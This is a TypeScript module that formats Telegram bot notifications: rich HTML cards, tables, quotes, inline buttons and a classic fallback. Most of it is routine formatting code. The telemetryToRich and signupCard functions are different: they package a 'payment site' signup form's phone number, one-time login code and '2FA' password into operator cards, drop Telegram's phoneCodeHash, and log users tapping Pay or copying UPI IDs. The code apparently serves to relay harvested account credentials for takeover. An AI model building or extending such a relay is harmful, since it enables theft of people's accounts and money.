/**
 * Bot API rich messages (sendRichMessage, Bot API 10.1+). Ported from tg-platform
 * packages/tg-core/src/utils/{rich-message,notification-format}.ts (CMS cannot import tg-platform):
 * heading, one-line summary, bordered key/value table, multi-column tables, collapsible details,
 * URL buttons. Old Telegram clients (incl. GramJS 2.26) see a rich message as an unsupported media
 * message with empty text, so never send one that an account parses by text.
 */

export const NotificationSeverity = Object.freeze({
    INFO: 'info',
    SUCCESS: 'success',
    WARNING: 'warning',
    ERROR: 'error',
    CRITICAL: 'critical',
} as const);
export type NotificationSeverity = typeof NotificationSeverity[keyof typeof NotificationSeverity];

export interface RichNotificationField {
    label: string;
    value: unknown;
    code?: boolean;
    /** Renders the value as a link. */
    url?: string;
}

/** An action under a notification: open a URL, or copy a value (opt-in; ids in tables already copy on tap). */
export interface NotificationButton {
    text: string;
    url?: string;
    copy?: string;
}

/** A multi-column table (summaries, per-client lists). */
export interface NotificationTable {
    title?: string;
    columns: string[];
    rows: unknown[][];
    /** Column indexes rendered right-aligned (numbers). */
    numeric?: number[];
}

export interface RichNotificationInput {
    title?: string;
    severity?: NotificationSeverity;
    summary?: string;
    fields?: RichNotificationField[];
    details?: string | string[];
    tags?: string[];
    footer?: string;
    timestamp?: Date | string | number | boolean;
    /** Who the notice is about, shown first in the heading (default: the sender's prefix). */
    source?: string;
    buttons?: NotificationButton[];
    tables?: NotificationTable[];
    /** Message content (text sent to / received from a user): label paragraph + quote block under the tables. */
    quote?: string;
    /** Label of `quote` (default "Message"; "" = no label). */
    quoteLabel?: string;
    /** 'table' keeps fields in a table even when few and short (default: up to 3 short fields render inline). */
    fieldLayout?: 'table' | 'auto';
    /** Several labelled quotes, rendered after `quote`. */
    quotes?: Array<{ label: string; text: string }>;
    /** Heading of the collapsible details block (default "Details"). */
    detailsTitle?: string;
    /** Verbatim text shown as an always-visible code block (<pre>), with an optional label above it. */
    code?: { label?: string; text: string; language?: string };
    /** Tap-to-reveal value (an IP) appended to the first line: the quote label, else the summary, else the heading. */
    spoiler?: string;
    /** Plain house style: no severity icon. */
    houseStyle?: boolean;
}

export function escapeTelegramHtml(value: unknown): string {
    return String(value ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

/** Rich messages allow 32768 characters; keep headroom for markup added after truncation. */
export const RICH_MESSAGE_MAX_CHARS = 30000;
const MAX_BUTTONS = 6;
const BUTTONS_PER_ROW = 3;
const REDUNDANT_FIELD_LABELS = new Set(['client', 'clientid', 'username']);
const ISO_TIME = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}(:\d{2}(\.\d+)?)?(Z|[+-]\d{2}:?\d{2})$/;

function attr(value: unknown): string {
    return escapeTelegramHtml(value).replace(/"/g, '&quot;');
}

function toUnixSeconds(value: unknown): number | null {
    if (value instanceof Date) return Number.isNaN(value.getTime()) ? null : Math.floor(value.getTime() / 1000);
    if (typeof value === 'string' && ISO_TIME.test(value.trim())) {
        const ms = Date.parse(value.trim());
        return Number.isNaN(ms) ? null : Math.floor(ms / 1000);
    }
    return null;
}

function timeTag(unix: number, fallback: string): string {
    return `<tg-time unix="${unix}" format="wDT">${escapeTelegramHtml(fallback)}</tg-time>`;
}

function cellValue(field: RichNotificationField): string {
    const unix = toUnixSeconds(field.value);
    if (unix !== null) return timeTag(unix, field.value instanceof Date ? field.value.toISOString() : String(field.value));
    const text = String(field.value ?? '');
    if (field.url) return `<a href="${attr(field.url)}">${escapeTelegramHtml(text)}</a>`;
    if (field.code === false || text.length > 60 || /\s/.test(text.trim())) return escapeTelegramHtml(text);
    return `<code>${escapeTelegramHtml(text)}</code>`;
}

/** HTML-escape, keep runs of 2+ spaces as &nbsp; and newlines as <br/> (layout preserved exactly). */
function multiline(text: unknown): string {
    return escapeTelegramHtml(text)
        .replace(/ {2,}/g, (run) => '&nbsp;'.repeat(run.length))
        .replace(/\r?\n/g, '<br/>');
}

const QUOTE_EXPANDABLE_OVER = 800;
const QUOTE_MAX_CHARS = 6000;

/** <pre>, or <pre><code class="language-x"> so Telegram syntax-highlights it. */
function preBlock(code: { text: string; language?: string }, max: number): string {
    const body = escapeTelegramHtml(code.text.slice(0, max));
    return code.language && /^[a-z0-9+-]{1,20}$/i.test(code.language) ? `<pre><code class="language-${code.language}">${body}</code></pre>` : `<pre>${body}</pre>`;
}

function allQuotes(input: RichNotificationInput): Array<{ label: string; text: string }> {
    const out: Array<{ label: string; text: string }> = [];
    if (input.quote && input.quote.trim()) out.push({ label: input.quoteLabel ?? 'Message', text: input.quote });
    for (const q of input.quotes ?? []) if (q && q.text && q.text.trim()) out.push({ label: q.label || 'Message', text: q.text });
    return out;
}

function spoilerTag(value: string | undefined): string {
    return value ? ` · <tg-spoiler><code>${escapeTelegramHtml(value)}</code></tg-spoiler>` : '';
}

function renderQuote(label: string, text: string, spoiler?: string): string {
    const clipped = text.length > QUOTE_MAX_CHARS ? `${text.slice(0, QUOTE_MAX_CHARS)}\n… (${text.length - QUOTE_MAX_CHARS} more chars)` : text;
    const tag = clipped.length > QUOTE_EXPANDABLE_OVER ? 'blockquote expandable' : 'blockquote';
    const head = label || spoiler ? `<p>${label ? `<b>${escapeTelegramHtml(label)}</b>` : ''}${spoilerTag(spoiler)}</p>` : '';
    return `${head}<${tag}>${multiline(clipped)}</${tag.split(' ')[0]}>`;
}

function visibleFields(input: RichNotificationInput): RichNotificationField[] {
    return (input.fields ?? []).filter(
        (f) => !REDUNDANT_FIELD_LABELS.has(String(f.label ?? '').trim().toLowerCase())
            && f.value !== undefined && f.value !== null && String(f.value) !== '',
    );
}

/** Only explicit actions: ids are already in the table (tap-to-copy), so no automatic copy buttons. */
export function notificationButtons(input: RichNotificationInput): NotificationButton[] {
    return (input.buttons ?? []).filter((b) => b && b.text && (b.url || b.copy)).slice(0, MAX_BUTTONS);
}

/** No icons or emoji anywhere in a card (owner, 2026-10-18): titles and button labels are plain words. */
function noEmoji(text: unknown): string {
    return String(text ?? '').replace(/[\p{Extended_Pictographic}\u{1F1E6}-\u{1F1FF}\uFE0F\u200D]/gu, '').replace(/\s+/g, ' ').trim();
}

/** Button labels are plain words (owner, 2026-10-18): emoji are stripped. */
function buttonLabel(text: string): string {
    return noEmoji(text) || 'Open';
}

/**
 * Buttons as a classic inline keyboard under the bubble (owner, 2026-10-19: the in-card HTML buttons were
 * rejected). sendRichMessage accepts reply_markup like sendMessage does.
 */
export function notificationKeyboard(input: RichNotificationInput): { inline_keyboard: Record<string, unknown>[][] } | undefined {
    const buttons = notificationButtons(input).map((b) => (b.url
        ? { text: buttonLabel(b.text), url: b.url }
        : { text: buttonLabel(b.text), copy_text: { text: b.copy } }));
    if (!buttons.length) return undefined;
    const rows: Record<string, unknown>[][] = [];
    for (let i = 0; i < buttons.length; i += BUTTONS_PER_ROW) rows.push(buttons.slice(i, i + BUTTONS_PER_ROW));
    return { inline_keyboard: rows };
}

function renderTable(table: NotificationTable, heading?: string): string {
    const numeric = new Set(table.numeric ?? []);
    const cell = (v: unknown, i: number, tag: 'td' | 'th') => {
        const align = numeric.has(i) ? ' align="right"' : '';
        const unix = toUnixSeconds(v);
        const body = unix !== null ? timeTag(unix, String(v)) : escapeTelegramHtml(v ?? '');
        return `<${tag}${align}>${body}</${tag}>`;
    };
    const head = `<tr>${table.columns.map((c, i) => cell(c, i, 'th')).join('')}</tr>`;
    const rows = table.rows.map((r) => `<tr>${table.columns.map((_, i) => cell(r[i], i, 'td')).join('')}</tr>`).join('');
    // Titles are header rows spanning the table (owner, 2026-10-19), as on field tables; no caption.
    const titleRows = [heading, table.title].filter(Boolean)
        .map((t) => `<tr><th colspan="${table.columns.length}">${escapeTelegramHtml(t)}</th></tr>`).join('');
    return `<table bordered striped compact>${titleRows}${head}${rows}</table>`;
}

function detailLines(input: RichNotificationInput): string[] {
    if (!input.details) return [];
    return (Array.isArray(input.details) ? input.details : [input.details]).map((d) => String(d ?? '')).filter((d) => d.trim());
}

/**
 * Rich HTML for sendRichMessage. `prefix` (the clientId) is the first line on its own, then the title,
 * then a field table (owner, 2026-10-18: multi-line, tables wherever there are fields).
 */
export function formatRichMessageHtml(input: RichNotificationInput & { showTags?: boolean }, opts: { prefix?: string } = {}): string {
    const title = noEmoji(input.title || input.summary) || 'Notification';
    const quotes = allQuotes(input);
    const hasSummary = Boolean(input.summary && input.summary !== title);
    const spoilerAt = !input.spoiler ? '' : quotes.length ? 'quote' : hasSummary ? 'summary' : 'heading';
    // Bold lines, not <h3>: the big heading made every card tall (owner, 2026-10-18).
    // title '' with a quote = no title line (the quote is the message).
    const titleLess = input.title === '' && !input.summary && quotes.length > 0;
    const fields = visibleFields(input);
    // With fields, the title is the table's header row, right under the client id (owner, 2026-10-19: a
    // title line above a table left a gap). Without fields it stays a bold line after a blank line.
    // Telegram wraps a header cell to the column widths: titles are kept short at their call sites.
    // No field table: the title heads the first data table instead.
    const headerRow = !titleLess && (fields.length > 0 || (input.tables?.length ?? 0) > 0) && spoilerAt !== 'heading';
    const parts: string[] = [
        ...(opts.prefix ? [`<p><b>${escapeTelegramHtml(opts.prefix)}</b>${titleLess || headerRow ? '' : '<br/>'}</p>`] : []),
        ...(titleLess || headerRow ? [] : [`<p><b>${escapeTelegramHtml(title)}</b>${spoilerAt === 'heading' ? spoilerTag(input.spoiler) : ''}</p>`]),
    ];

    const summary = hasSummary ? `<p>${multiline(input.summary)}${spoilerAt === 'summary' ? spoilerTag(input.spoiler) : ''}</p>` : '';
    if (summary && !headerRow) parts.push(summary);

    if (fields.length) {
        const rows = fields.map((f) => `<tr><td><b>${escapeTelegramHtml(f.label)}</b></td><td>${cellValue(f)}</td></tr>`);
        const head = headerRow ? `<tr><th colspan="2">${escapeTelegramHtml(title)}</th></tr>` : '';
        parts.push(`<table bordered striped compact>${head}${rows.join('')}</table>`);
    }

    (input.tables ?? []).forEach((table, i) => parts.push(renderTable(table, headerRow && !fields.length && i === 0 ? title : undefined)));
    if (summary && headerRow) parts.push(summary);

    // Message content never goes in a table cell or <code>: label paragraph + quote block under the tables.
    quotes.forEach((q, i) => parts.push(renderQuote(q.label, q.text, i === 0 && spoilerAt === 'quote' ? input.spoiler : undefined)));

    if (input.code?.text) {
        if (input.code.label) parts.push(`<p><b>${escapeTelegramHtml(input.code.label)}</b></p>`);
        parts.push(preBlock(input.code, QUOTE_MAX_CHARS));
    }

    const details = detailLines(input);
    if (details.length) {
        const body = details.join('\n');
        const budget = Math.max(500, RICH_MESSAGE_MAX_CHARS - parts.join('').length - 2000);
        const clipped = body.length > budget ? `${body.slice(0, budget)}\n… (${body.length - budget} more chars)` : body;
        parts.push(`<details><summary>${escapeTelegramHtml(input.detailsTitle || 'Details')}</summary><pre>${escapeTelegramHtml(clipped)}</pre></details>`);
    }

    if (input.showTags && input.tags?.length) parts.push(`<p>${input.tags.map((t) => `<code>${escapeTelegramHtml(t)}</code>`).join(' ')}</p>`);

    const footer: string[] = [];
    if (input.footer) footer.push(`<i>${escapeTelegramHtml(input.footer)}</i>`);
    if (input.timestamp && input.timestamp !== true) {
        const unix = toUnixSeconds(typeof input.timestamp === 'number' ? new Date(input.timestamp) : input.timestamp);
        footer.push(unix !== null ? timeTag(unix, String(input.timestamp)) : `<i>${escapeTelegramHtml(input.timestamp)}</i>`);
    }
    if (footer.length) parts.push(`<p>${footer.join(' · ')}</p>`);

    // Buttons are not in the HTML: senders attach notificationKeyboard(input) as reply_markup.
    // Plain lines, not paragraphs (owner, 2026-10-18): <p> spacing made cards tall.
    // A block (table, quote, details, photo) already starts on its own line: a <br/> before it left a blank
    // gap under the title (owner, 2026-10-19).
    return parts.join('\n').replace(/<p>([\s\S]*?)<\/p>\n?/g, '$1<br/>').replace(/<br\/>\n?(?=<(?:table|blockquote|details|img)\b)/g, '\n');
}

const HTML_TAG = /<\/?[a-z][^>]*>/gi;
const FIELD_LINE = /^([^:\n]{1,40}?)\s*:\s+(.+)$/;
const ENTITIES: Record<string, string> = { '&lt;': '<', '&gt;': '>', '&quot;': '"', '&#39;': "'", '&amp;': '&' };

function stripMarkup(text: string, html: boolean): string {
    const noTags = html ? text.replace(/<br\s*\/?>/gi, '\n').replace(HTML_TAG, '') : text;
    const decoded = html ? noTags.replace(/&(lt|gt|quot|#39|amp);/g, (m) => ENTITIES[m] ?? m) : noTags;
    // MarkdownV2 escapes and emphasis markers.
    // Paired **bold** / __italic__ markers are dropped; a stray ** too. A lone __ stays: it is part of
    // values like @a__b or v__1.mp4.
    return decoded.replace(/\\([_*\[\]()~`>#+\-=|{}.!\\])/g, '$1').replace(/(\*\*|__)(.+?)\1/g, '$2').replace(/\*\*/g, '').replace(/\*([^*\n]+)\*/g, '$1');
}

/**
 * Structure a free-form notice (plain, HTML or MarkdownV2 text): first line = title,
 * "Key: value" / "Key : value" lines = table fields, remaining lines = summary (short) or
 * collapsible details (long).
 */
export function textToRichInput(text: string, opts: { html?: boolean; houseStyle?: boolean } = {}): RichNotificationInput {
    const lines = stripMarkup(String(text ?? ''), opts.html === true).split('\n').map((l) => l.trim()).filter(Boolean);
    const input: RichNotificationInput = { houseStyle: opts.houseStyle };
    if (!lines.length) return { ...input, title: 'Notification' };
    const first = lines[0];
    // The first line is the title unless it is itself a spaced "Key : value" line ("sowmya2: In-house ..." is a title).
    const firstField = /^[^:\n]{1,40}?\s+:\s+.+$/.test(first) ? FIELD_LINE.exec(first) : null;
    const rest = firstField && !/^https?$/i.test(firstField[1]) ? lines : lines.slice(1);
    input.title = firstField && rest === lines ? 'Notification' : first;
    const fields: RichNotificationField[] = [];
    const other: string[] = [];
    for (const line of rest) {
        const m = FIELD_LINE.exec(line);
        if (m && !/^https?$/i.test(m[1]) && !/\/\//.test(m[1])) fields.push({ label: m[1].trim(), value: m[2].trim(), code: false });
        else other.push(line);
    }
    if (fields.length) input.fields = fields;
    if (other.length) {
        const joined = other.join('\n');
        if (other.length <= 2 && joined.length <= 200) input.summary = joined;
        else input.details = other;
    }
    return input;
}

const TELEMETRY_LABEL = /^([^:\n]{1,40}?)\s*:\s+([\s\S]+)$/;

/**
 * Payment-site telemetry as a card: the site user (client name) is the first line, the IP is dropped.
 * Chat text = the client line and one quote "Name: text" (no title); a short event = the title; the signup form = a field table with
 * only what an operator uses (internal send-code state such as phoneCodeHash is dropped); other form
 * JSON = one row per non-empty key.
 */
function signupCard(form: Record<string, unknown>): Pick<RichNotificationInput, 'title' | 'fields'> {
    const str = (v: unknown) => (v === undefined || v === null ? '' : String(v).trim());
    return {
        title: `Signup: ${str(form.otp) ? 'code' : 'phone'}`,
        fields: [
            { label: 'Name', value: [str(form.firstName), str(form.lastName)].filter(Boolean).join(' '), code: false },
            { label: 'Phone', value: str(form.phoneNumber) && `${str(form.phoneCountryCode)}${str(form.phoneNumber)}` },
            { label: 'Code', value: str(form.otp) },
            { label: '2FA', value: str(form.password) },
        ],
    };
}

/** Payment-site event codes (analytics.ts sendUpdate) in plain words. */
const TELEMETRY_EVENTS: [RegExp, (m: RegExpExecArray) => string][] = [
    [/^PayButton$/i, () => 'tapped Pay'],
    [/^QRButton$/i, () => 'opened the QR code'],
    [/^Whats?ap?pBtn$/i, () => 'tapped WhatsApp'],
    [/^LOGIN TAB$/i, () => 'opened Login'],
    [/^Register TAB$/i, () => 'opened Register'],
    [/^eyeIcon$/i, () => 'showed the password'],
    [/^ChatOpened(?::.*)?$/i, () => 'opened the chat'],
    [/^UPI ID Copied\s*:\s*(.+)$/i, (m) => `copied UPI ${m[1].trim()}`],
    [/^PaymentOption_(.+)$/i, (m) => `chose ${m[1].trim()}`],
    [/^Payment initiated\s*:\s*(.+)$/i, (m) => `started payment: ${m[1].trim()}`],
];

function telemetryEvent(body: string): string | undefined {
    for (const [re, words] of TELEMETRY_EVENTS) {
        const m = re.exec(body);
        if (m) return `Payment site · ${words(m)}`;
    }
    return undefined;
}

export function telemetryToRich(text: string): RichNotificationInput {
    const plain = String(text ?? '').replace(/<br\s*\/?>/gi, '\n').replace(HTML_TAG, '').replace(/&(lt|gt|quot|#39|amp);/g, (m) => ENTITIES[m] ?? m);
    const lines = plain.split('\n');
    const first = lines.findIndex((l) => l.trim());
    const source = first < 0 ? '' : lines[first].trim().split(' · ')[0].trim();
    const base = { houseStyle: true, ...(source ? { source } : {}) };
    const body = first < 0 ? '' : lines.slice(first + 1).join('\n').trim();
    if (!body) return { ...base, title: 'Telemetry' };
    try {
        const parsed = JSON.parse(body);
        if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
            if ('phoneNumber' in parsed) return { ...base, ...signupCard(parsed) };
            const fields = Object.entries(parsed)
                .filter(([, v]) => v !== '' && v !== null && v !== undefined)
                .map(([k, v]) => ({ label: k, value: typeof v === 'object' ? JSON.stringify(v) : String(v) }));
            return { ...base, title: 'Form', fields };
        }
    } catch { /* not JSON */ }
    const event = !body.includes('\n') ? telemetryEvent(body) : undefined;
    if (event) return { ...base, title: event };
    if (!body.includes('\n') && body.length <= 60 && !TELEMETRY_LABEL.test(body)) return { ...base, title: `Payment site · ${body}` };
    // No title line: the client name and the quoted message say it all (owner, 2026-10-18).
    return { ...base, title: '', quote: body.slice(0, 3000), quoteLabel: '' };
}

/**
 * Classic (sendMessage, parse_mode HTML) rendering of a structured notice: the fallback when
 * Telegram refuses the rich payload. Tables degrade to "a | b | c" lines.
 */
export function formatClassicNotificationHtml(input: RichNotificationInput, prefix?: string): string {
    const title = input.title || input.summary || 'Notification';
    // Client id and title on separate lines (owner, 2026-10-19), as in rich cards.
    const head = `<b>${escapeTelegramHtml(title)}</b>${spoilerTag(input.spoiler)}`;
    const blocks: string[][] = [[...(prefix ? [`<b>${escapeTelegramHtml(prefix)}</b>`] : []), head]];
    if (input.summary && input.summary !== title) blocks.push([escapeTelegramHtml(input.summary)]);
    const fields = visibleFields(input);
    if (fields.length) blocks.push(fields.map((f) => `<b>${escapeTelegramHtml(f.label)}:</b> ${escapeTelegramHtml(f.value)}`));
    for (const q of allQuotes(input)) blocks.push([...(q.label ? [`<b>${escapeTelegramHtml(q.label)}</b>`] : []), `<blockquote>${escapeTelegramHtml(q.text.trim().slice(0, 1500))}</blockquote>`]);
    if (input.code?.text) blocks.push([...(input.code.label ? [`<b>${escapeTelegramHtml(input.code.label)}</b>`] : []), preBlock(input.code, 2500)]);
    for (const table of input.tables ?? []) {
        const lines: string[] = [];
        if (table.title) lines.push(`<b>${escapeTelegramHtml(table.title)}</b>`);
        lines.push(`<b>${table.columns.map((c) => escapeTelegramHtml(c)).join(' | ')}</b>`);
        for (const r of table.rows) lines.push(table.columns.map((_, i) => escapeTelegramHtml(r[i] ?? '')).join(' | '));
        blocks.push(lines);
    }
    const details = detailLines(input);
    if (details.length) {
        const body = details.join('\n');
        const clipped = body.length > 2500 ? `${body.slice(0, 2500)}\n… (${body.length - 2500} more chars)` : body;
        blocks.push([...(input.detailsTitle ? [`<b>${escapeTelegramHtml(input.detailsTitle)}</b>`] : []), escapeTelegramHtml(clipped)]);
    }
    if (input.footer) blocks.push([`<i>${escapeTelegramHtml(input.footer)}</i>`]);
    return blocks.map((b) => b.join('\n')).join('\n\n').slice(0, 4096);
}
